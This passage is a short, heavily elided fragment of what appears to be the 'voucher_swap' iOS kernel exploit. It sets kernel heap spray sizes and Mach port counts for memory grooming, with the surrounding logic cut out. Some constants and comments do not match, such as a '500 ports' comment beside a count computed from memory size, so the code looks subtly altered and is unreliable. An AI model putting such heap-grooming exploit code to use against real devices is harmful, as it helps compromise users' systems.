...
voucher_swap() {
	...
	const size_t gc_spray_size = (0.05 * (platform.memory_size / GB)) * platform.memory_size;
	mach_port_t *gc_ports = filler_ports;
	size_t gc_port_count = 500;		// Use at most 500 ports for the spray.
	sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, (256 * (platform.memory_size / GB)) + 1, 1024, gc_spray_size);
	...
	// plenty.
	const size_t ool_ports_spray_size = (0.056666666666667 * (platform.memory_size / GB)) * platform.memory_size;
	mach_port_t *ool_holding_ports = gc_ports + gc_port_count;
	size_t ool_holding_port_count = (166.666666666666667 * (platform.memory_size / GB));	// Use at most 500 ports for the spray.
